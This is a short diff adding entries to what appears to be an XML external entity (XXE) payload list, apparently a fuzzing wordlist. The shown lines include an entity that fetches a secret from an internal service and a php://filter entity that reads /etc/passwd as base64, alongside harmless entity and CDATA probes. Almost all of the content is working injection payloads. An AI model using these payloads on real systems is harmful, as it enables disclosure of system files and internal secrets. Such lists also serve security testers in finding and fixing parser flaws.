@@ -1,2 +1,6 @@
 <!--?xml version="1.0" ?><!DOCTYPE test1 [<!ENTITY example "WSXedc"> ]><userInfo><firstName>John</firstName><lastName>&example;</lastName></userInfo>
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE test2 [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >]><foo>&xxe;</foo>
+<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >
+<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
+<?xml version="1.0" encoding="ISO-8859-1"?><test></test>
+<![CDATA[<test></test>]]>
